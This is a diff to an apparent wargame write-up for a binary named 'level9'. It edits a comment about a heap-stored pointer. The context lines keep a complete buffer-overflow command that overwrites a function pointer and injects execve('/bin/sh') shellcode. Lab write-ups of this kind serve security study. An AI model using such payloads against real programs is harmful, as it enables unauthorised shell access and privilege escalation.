@@ -3,6 +3,6 @@
 # the padding is 108, if we overwrite the next 4 bytes it's segv
 # Looking at the code it's this line who segv : 
 0x08048693 <+159>:	call   *%edx
-# In fact the adress stored in edx point to another adress, who itself point on the adess of the code.
+# In fact the adress stored in edx is on the heap and point to another adress, who itself point on the adess of the code.
 # So now we kow that we just have to build the payload
 ./level9 $(python -c 'print "A"*108 + "\x80\xa0\x04\x08" + "A"*4 + "\x90\xa0\x04\x08" + "A"*12 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')
